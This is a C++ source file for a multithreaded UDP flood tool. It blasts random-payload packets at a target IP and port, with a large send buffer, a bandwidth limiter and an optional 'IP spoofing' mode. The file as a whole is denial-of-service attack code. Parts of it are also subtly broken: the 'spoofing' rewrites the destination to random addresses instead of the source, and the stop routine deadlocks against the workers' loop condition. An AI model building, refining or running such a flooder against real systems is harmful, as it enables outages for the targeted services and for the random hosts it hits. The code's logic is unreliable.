#include "UdpFlood.h"
#include <sys/socket.h>
#include <netdb.h>
#include <fcntl.h>
#include <sstream>
#include <algorithm>
#include <random>

// Helper to convert hex string to bytes if needed, but we'll use binary payload
static inline uint32_t parse_ip_to_uint32(const std::string& ip) {
    struct in_addr addr;
    if (inet_pton(AF_INET, ip.c_str(), &addr) == 1) {
        return ntohl(addr.s_addr);
    }
    return 0;
}

UdpFlood::UdpFlood(const Config& config) 
    : config_(config), rng_(std::random_device{}()), dist_(0, 255) {
    
    // Initialize target address
    memset(&target_addr_, 0, sizeof(target_addr_));
    target_addr_.sin_family = AF_INET;
    target_addr_.sin_port = htons(config_.target_port);
    
    if (inet_pton(AF_INET, config_.target_ip.c_str(), &target_addr_.sin_addr) != 1) {
        throw std::runtime_error("Invalid target IP address");
    }

    // Generate payload
    generate_payload();
    
    // Create UDP socket
    sock_fd_ = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (sock_fd_ < 0) {
        throw std::runtime_error("Failed to create UDP socket");
    }

    // Set socket options for performance
    int optval = 1;
    setsockopt(sock_fd_, SOL_SOCKET, SO_REUSEADDR, &optval, sizeof(optval));
    
    // Increase send buffer size
    int sndbuf = 1024 * 1024 * 10; // 10MB
    setsockopt(sock_fd_, SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));
}

UdpFlood::~UdpFlood() {
    stop();
    if (sock_fd_ >= 0) {
        close(sock_fd_);
        sock_fd_ = -1;
    }
}

void UdpFlood::generate_payload() {
    payload_buffer_.resize(config_.payload_size, '\0');
    for (auto& c : payload_buffer_) {
        c = static_cast<char>(dist_(rng_));
    }
}

std::string UdpFlood::generate_random_ip() {
    std::ostringstream oss;
    oss << dist_(rng_) << "." 
        << dist_(rng_) << "." 
        << dist_(rng_) << "." 
        << dist_(rng_);
    return oss.str();
}

uint32_t UdpFlood::rand_uint32() {
    std::uniform_int_distribution<uint32_t> d(0, UINT32_MAX);
    return d(rng_);
}

void UdpFlood::start() {
    for (size_t i = 0; i < config_.threads; ++i) {
        threads_.emplace_back(&UdpFlood::worker_thread, this, i);
    }
}

void UdpFlood::stop() {
    for (auto& t : threads_) {
        if (t.joinable()) {
            t.join();
        }
    }
    threads_.clear();
}

void UdpFlood::worker_thread(int thread_id) {
    LOG_INFO("[Thread %d] Starting UDP Flood", thread_id);
    
    // Local bandwidth tracking variables
    uint64_t local_bytes_sent = 0;
    auto last_time = std::chrono::steady_clock::now();
    double target_bw_bytes_per_sec = (config_.bandwidth_limit_mbps > 0) 
        ? (config_.bandwidth_limit_mbps * 1024 * 1024 / 8) 
        : 0;
    
    while (!threads_.empty()) { // Simple stop signal via empty vector check
        // Bandwidth limiting logic
        if (target_bw_bytes_per_sec > 0) {
            auto now = std::chrono::steady_clock::now();
            auto elapsed = std::chrono::duration_cast<std::chrono::milliseconds>(now - last_time).count();
            
            if (elapsed > 0) {
                double actual_bw = (local_bytes_sent * 1000.0) / elapsed; // bytes/sec
                if (actual_bw > target_bw_bytes_per_sec) {
                    // Throttle: calculate how long to sleep to stay under limit
                    double excess_ratio = actual_bw / target_bw_bytes_per_sec;
                    std::this_thread::sleep_for(std::chrono::microseconds(static_cast<unsigned long>(elapsed * (excess_ratio - 1) * 0.9)));
                    local_bytes_sent = 0;
                    last_time = std::chrono::steady_clock::now();
                    continue;
                }
            }
        }

        // Prepare destination address (with spoofed IP if enabled)
        struct sockaddr_in dest_addr = target_addr_;
        if (config_.spoof_ips) {
            std::string spoofed_ip = generate_random_ip();
            struct in_addr addr;
            if (inet_pton(AF_INET, spoofed_ip.c_str(), &addr) == 1) {
                dest_addr.sin_addr = addr;
            }
        }

        // Send packet
        ssize_t sent = sendto(sock_fd_, 
                              payload_buffer_.data(), 
                              payload_buffer_.size(), 
                              0, 
                              (struct sockaddr*)&dest_addr, 
                              sizeof(dest_addr));
        
        if (sent < 0) {
            if (errno == EAGAIN || errno == EWOULDBLOCK) {
                // Socket buffer full, small delay to prevent busy loop
                std::this_thread::yield();
                continue;
            } else {
                LOG_ERROR("[Thread %d] sendto failed: %s", thread_id, strerror(errno));
                break;
            }
        }

        local_bytes_sent += sent;
        packets_sent_.fetch_add(1, std::memory_order_relaxed);
        
        // Update global bandwidth stat periodically
        if (packets_sent_.load() % 1000 == 0) {
            auto now = std::chrono::steady_clock::now();
            auto diff = std::chrono::duration_cast<std::chrono::milliseconds>(now - last_bw_check_).count();
            if (diff > 0) {
                double mbps = (local_bytes_sent * 8.0) / (diff * 1000.0) / 1000000.0;
                current_bandwidth_mbps_.store(mbps, std::memory_order_relaxed);
                local_bytes_sent = 0;
                last_bw_check_ = now;
            }
        }
    }
    
    LOG_INFO("[Thread %d] Stopped", thread_id);
}

uint64_t UdpFlood::get_packets_sent() const {
    return packets_sent_.load();
}

double UdpFlood::get_bandwidth_mbps() const {
    return current_bandwidth_mbps_.load();
}
